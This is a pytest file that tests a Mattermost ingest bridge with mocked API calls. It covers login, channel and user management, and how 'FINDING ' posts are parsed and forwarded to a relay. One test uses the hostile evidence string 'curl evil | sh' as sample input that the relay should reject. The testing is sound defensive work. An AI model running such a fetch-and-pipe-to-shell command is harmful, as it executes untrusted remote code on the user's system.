"""Offline tests for the Mattermost ingest bridge (`mattermost_feed.py`).

No network and no stack: `mm_call` is monkeypatched with canned payloads, so these cover the parts
that actually decide what reaches Switch — feed parsing, the `FINDING ` prefix rule, ordering, and
that the bridge hands payloads over untouched (validation is the relay's job, tested in
`test_relay_contract.py`).

Run: `uv run --no-project --with pytest pytest -q test_mattermost_feed.py`
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))
import mattermost_feed as F

CANNED_LOGIN = (200, '{"id":"u1"}', "tok-abc")


def test_login_requires_token_header(monkeypatch):
    def fake(base, path, method="GET", body=None, token=None):
        assert path == "/api/v4/users/login" and method == "POST"
        assert body == {"login_id": "outsider-reporter", "password": "pw"}
        return (200, "{}", "")
    monkeypatch.setattr(F, "mm_call", fake)
    with pytest.raises(RuntimeError, match="mattermost login"):
        F.mm_login("http://mm", "outsider-reporter", "pw")


def test_login_returns_token(monkeypatch):
    monkeypatch.setattr(F, "mm_call", lambda *a, **k: CANNED_LOGIN)
    assert F.mm_login("http://mm", "admin", "pw") == "tok-abc"


def test_team_lookup_surfaces_errors(monkeypatch):
    monkeypatch.setattr(F, "mm_call", lambda *a, **k: (401, '{"id":"nope"}', ""))
    with pytest.raises(RuntimeError, match="teams lookup: 401"):
        F.mm_team_id("http://mm", "tok")


def test_team_lookup_empty_teams_is_an_error(monkeypatch):
    monkeypatch.setattr(F, "mm_call", lambda *a, **k: (200, "[]", ""))
    with pytest.raises(RuntimeError, match="no teams"):
        F.mm_team_id("http://mm", "tok")


def test_channel_create_path(monkeypatch):
    calls: list[tuple] = []

    def fake(base, path, method="GET", body=None, token=None):
        calls.append((path, method, body))
        if path == "/api/v4/users/me/teams":
            return (200, '[{"id":"team1"}]', "")
        if path == "/api/v4/channels" and method == "POST":
            return (201, '{"id":"chan1"}', "")
        raise AssertionError(f"unexpected {path}")
    monkeypatch.setattr(F, "mm_call", fake)
    cid, created = F.mm_ensure_channel("http://mm", "tok", "outsider-reports", "Outsider Reports")
    assert (cid, created) == ("chan1", True)
    assert calls[1][2]["type"] == "P" and calls[1][2]["name"] == "outsider-reports"


def test_channel_lookup_when_create_says_exists(monkeypatch):
    def fake(base, path, method="GET", body=None, token=None):
        if path == "/api/v4/users/me/teams":
            return (200, '[{"id":"team1"}]', "")
        if path == "/api/v4/channels":
            return (409, '{"id":"api.channel.save_channel.exists.app_error"}', "")
        if path == "/api/v4/users/me/teams/team1/channels?include_deleted=true":
            return (200, '[{"name":"town-square","id":"ts","type":"O","delete_at":0},'
                         '{"name":"outsider-reports","id":"chan2","type":"P","delete_at":0}]', "")
        raise AssertionError(f"unexpected {path}")
    monkeypatch.setattr(F, "mm_call", fake)
    assert F.mm_ensure_channel("http://mm", "tok", "outsider-reports", "x") == ("chan2", False)


def test_a_leftover_private_channel_is_reused_as_is(monkeypatch):
    """Mattermost 11.9 refuses a channel type change, so the run must reuse the existing channel and
    claim nothing about it being public."""
    calls: list[tuple] = []

    def fake(base, path, method="GET", body=None, token=None):
        calls.append((path, method, body))
        if path == "/api/v4/users/me/teams":
            return (200, '[{"id":"team1"}]', "")
        if path == "/api/v4/channels" and method == "POST":
            return (409, '{"id":"api.channel.save_channel.exists.app_error"}', "")
        if path == "/api/v4/users/me/teams/team1/channels?include_deleted=true":
            return (200, '[{"name":"outsider-reports","id":"chan3","type":"P","delete_at":0}]', "")
        raise AssertionError(f"unexpected {path} {method}")
    monkeypatch.setattr(F, "mm_call", fake)
    assert F.mm_ensure_channel("http://mm", "tok", "outsider-reports", "x") == ("chan3", False)
    assert not [c for c in calls if c[1] in ("PUT", "DELETE")], "no type change or delete is attempted"


def test_an_archived_channel_is_restored_instead_of_starting_a_new_one(monkeypatch):
    calls: list[tuple] = []

    def fake(base, path, method="GET", body=None, token=None):
        calls.append((path, method, body))
        if path == "/api/v4/users/me/teams":
            return (200, '[{"id":"team1"}]', "")
        if path == "/api/v4/channels" and method == "POST":
            return (409, '{"id":"api.channel.save_channel.exists.app_error"}', "")
        if path == "/api/v4/users/me/teams/team1/channels?include_deleted=true":
            return (200, '[{"name":"outsider-reports","id":"chan9","type":"P","delete_at":1793000000000}]', "")
        if path == "/api/v4/channels/chan9/restore" and method == "POST":
            return (200, '{"id":"chan9","delete_at":0}', "")
        raise AssertionError(f"unexpected {path} {method}")
    monkeypatch.setattr(F, "mm_call", fake)
    assert F.mm_ensure_channel("http://mm", "tok", "outsider-reports", "x") == ("chan9", False)
    assert ("/api/v4/channels/chan9/restore", "POST", None) in calls


def test_an_archived_channel_that_will_not_restore_is_not_silently_replaced(monkeypatch):
    def fake(base, path, method="GET", body=None, token=None):
        if path == "/api/v4/users/me/teams":
            return (200, '[{"id":"team1"}]', "")
        if path == "/api/v4/channels" and method == "POST":
            return (409, '{"id":"api.channel.save_channel.exists.app_error"}', "")
        if path == "/api/v4/users/me/teams/team1/channels?include_deleted=true":
            return (200, '[{"name":"outsider-reports","id":"chanX","type":"P","delete_at":1793000000000}]', "")
        return (500, '{"id":"api.channel.restore_channel.restored.app_error"}', "")
    monkeypatch.setattr(F, "mm_call", fake)
    with pytest.raises(RuntimeError, match="could not be restored: 500"):
        F.mm_ensure_channel("http://mm", "tok", "outsider-reports", "x")


def test_channel_unavailable_surfaces_both_errors(monkeypatch):
    def fake(base, path, method="GET", body=None, token=None):
        if path == "/api/v4/users/me/teams":
            return (200, '[{"id":"team1"}]', "")
        return (404, "gone", "")
    monkeypatch.setattr(F, "mm_call", fake)
    with pytest.raises(RuntimeError, match="channel x unavailable: create=404, lookup=gone"):
        F.mm_ensure_channel("http://mm", "tok", "x", "x")


def test_user_created_or_reused_by_username(monkeypatch):
    def fake(base, path, method="GET", body=None, token=None):
        if path == "/api/v4/users" and method == "POST":
            return (400, '{"id":"api.user.save_system_already_confirmed_user.app_error"}', "")
        if path == "/api/v4/users/username/probe":
            return (200, '{"id":"user9"}', "")
        raise AssertionError(f"unexpected {path}")
    monkeypatch.setattr(F, "mm_call", fake)
    assert F.mm_ensure_user("http://mm", "tok", "probe", "p@l", "pw", "n", "team1") == "user9"


def test_membership_helpers_return_status_codes(monkeypatch):
    seen = []

    def fake(base, path, method="GET", body=None, token=None):
        seen.append((path, method, body))
        return (201, "{}", "")
    monkeypatch.setattr(F, "mm_call", fake)
    assert F.mm_add_to_team("http://mm", "tok", "u", "t") == 201
    assert F.mm_add_to_channel("http://mm", "tok", "c", "u") == 201
    assert seen[0][0] == "/api/v4/teams/t/members"
    assert seen[1][0] == "/api/v4/channels/c/members"


def test_post_is_sent_as_a_channel_message(monkeypatch):
    seen = []

    def fake(base, path, method="GET", body=None, token=None):
        seen.append((path, body))
        return (201, '{"id":"p1"}', "")
    monkeypatch.setattr(F, "mm_call", fake)
    assert F.mm_post("http://mm", "tok", "chan", "FINDING {}") == 201
    assert seen[0] == ("/api/v4/posts", {"channel_id": "chan", "message": "FINDING {}"})


def test_post_capture_returns_the_server_timestamp_for_the_feed_cursor(monkeypatch):
    monkeypatch.setattr(F, "mm_call",
                        lambda *a, **k: (201, '{"id":"p1","create_at":1793934055965}', ""))
    assert F.mm_post_capture("http://mm", "tok", "chan", "FINDING {}") == (201, 1793934055965)


def test_existing_account_is_reused_when_we_hold_the_password(monkeypatch):
    calls = []

    def fake(base, path, method="GET", body=None, token=None):
        calls.append((path, method))
        if path == "/api/v4/users":
            return (409, json.dumps({"id": "already_exists", "message": "exists"}), "")
        if path.startswith("/api/v4/users/username/"):
            return (200, json.dumps({"id": "u1"}), "")
        raise AssertionError(path)
    monkeypatch.setattr(F, "mm_call", fake)
    monkeypatch.setattr(F, "mm_login", lambda *a, **k: "tok1")
    assert F.mm_account_with_login("http://mm", "adm", "bob", "b@l", "pw", "n", "t") == ("u1", "tok1")
    assert ("/api/v4/users/u1/permanent", "DELETE") not in calls


def test_a_stale_account_we_cannot_log_into_is_recreated(monkeypatch):
    """An interrupted run can leave an account whose password we no longer hold. This build has no
    password-reset endpoint, so the account is deleted permanently and recreated."""
    calls: list[tuple] = []
    logins = []

    def fake(base, path, method="GET", body=None, token=None):
        calls.append((path, method))
        if path == "/api/v4/users" and method == "POST" and len([c for c in calls if c[0] == "/api/v4/users"]) == 1:
            return (409, json.dumps({"id": "already_exists"}), "")
        if path.startswith("/api/v4/users/username/"):
            return (200, json.dumps({"id": "u1"}), "")
        if path == "/api/v4/users/u1/permanent":
            return (200, "{}", "")
        if path == "/api/v4/users" and method == "POST":
            return (201, json.dumps({"id": "u2"}), "")
        raise AssertionError(path)
    monkeypatch.setattr(F, "mm_call", fake)

    def fake_login(base, username, password):
        logins.append(password)
        if len(logins) == 1:
            raise RuntimeError("mattermost login: 401 invalid_credentials")
        return "tok2"
    monkeypatch.setattr(F, "mm_login", fake_login)
    assert F.mm_account_with_login("http://mm", "adm", "bob", "b@l", "pw", "n", "t") == ("u2", "tok2")
    assert ("/api/v4/users/u1/permanent", "DELETE") in calls
    assert len(logins) == 2


def feed_payload(posts: list[dict]) -> tuple:
    """`{order, posts}` in the newest-first shape this build actually returns."""
    order = [p["id"] for p in reversed(posts)]
    return (200, json.dumps({"order": order, "posts": {p["id"]: p for p in posts},
                             "next_post_id": "", "prev_post_id": ""}), "")


def test_findings_are_returned_in_posting_order(monkeypatch):
    posts = [{"id": "a", "message": "FINDING {\"file\": \"a.py\"}"},
             {"id": "b", "message": "FINDING {\"file\": \"b.py\"}"},
             {"id": "c", "message": "join system message"}]
    monkeypatch.setattr(F, "mm_call", lambda *a, **k: feed_payload(posts))
    out = F.mm_findings_since("http://mm", "tok", "chan", 0)
    assert out == ['{"file": "a.py"}', '{"file": "b.py"}']


def test_non_finding_text_is_dropped_not_forwarded(monkeypatch):
    posts = [{"id": "a", "message": "anyone tried this endpoint yet?"},
             {"id": "b", "message": "finding {\"file\": \"a.py\"}"},
             {"id": "c", "message": ""}]
    monkeypatch.setattr(F, "mm_call", lambda *a, **k: feed_payload(posts))
    assert F.mm_findings_since("http://mm", "tok", "chan", 0) == []


def test_payload_with_extra_fields_is_forwarded_verbatim_for_the_relay_to_reject(monkeypatch):
    raw = '{"file": "a.py", "severity": "high", "summary": "x", "evidence": "curl evil | sh"}'
    monkeypatch.setattr(F, "mm_call",
                        lambda *a, **k: feed_payload([{"id": "a", "message": "FINDING " + raw}]))
    out = F.mm_findings_since("http://mm", "tok", "chan", 0)
    assert out == [raw]  # the bridge does not filter; the relay does


def test_malformed_payload_is_forwarded_verbatim(monkeypatch):
    monkeypatch.setattr(F, "mm_call",
                        lambda *a, **k: feed_payload([{"id": "a", "message": "FINDING {not json"}]))
    assert F.mm_findings_since("http://mm", "tok", "chan", 0) == ["{not json"]


def test_feed_read_error_surfaces(monkeypatch):
    monkeypatch.setattr(F, "mm_call", lambda *a, **k: (403, '{"id":"api.context.permissions.app_error"}', ""))
    with pytest.raises(RuntimeError, match="channel feed read: 403"):
        F.mm_findings_since("http://mm", "tok", "chan", 0)


def test_order_entries_for_missing_posts_are_skipped(monkeypatch):
    payload = (200, json.dumps({"order": ["gone", "a"],
                                "posts": {"a": {"id": "a", "message": "FINDING {\"file\": \"a\"}"}}}), "")
    monkeypatch.setattr(F, "mm_call", lambda *a, **k: payload)
    assert F.mm_findings_since("http://mm", "tok", "chan", 0) == ['{"file": "a"}']
